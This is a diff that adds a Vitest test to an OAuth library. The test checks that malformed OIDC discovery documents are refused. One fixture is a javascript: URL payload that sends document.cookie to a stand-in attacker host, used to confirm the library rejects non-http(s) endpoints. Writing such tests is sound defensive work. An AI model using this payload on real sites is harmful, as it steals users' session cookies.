@@ -117,6 +117,26 @@ describe('oauth library', () => {
       );
     });
 
+    // F816: a 200 that is not a discovery document, or one whose authorization
+    // endpoint is not http(s) (the link flow hands it to location.assign), is refused.
+    it('refuses discovery documents without http(s) authorization/token endpoints', async () => {
+      const good = {
+        authorization_endpoint: 'https://auth.example.com/authorize',
+        token_endpoint: 'https://auth.example.com/token',
+      };
+      for (const doc of [
+        { status: 'starting' },
+        null,
+        { ...good, token_endpoint: undefined },
+        { ...good, authorization_endpoint: "javascript:fetch('//evil.example/'+document.cookie)//" },
+      ]) {
+        globalThis.fetch = vi.fn().mockResolvedValue({ ok: true, json: async () => doc } as never);
+        await expect(fetchOidcConfiguration('https://auth.example.com')).rejects.toThrow(
+          'lacks a valid authorization_endpoint/token_endpoint',
+        );
+      }
+    });
+
     it('exchanges OIDC authorization code for tokens', async () => {
       globalThis.fetch = vi.fn().mockResolvedValue({
         ok: true,
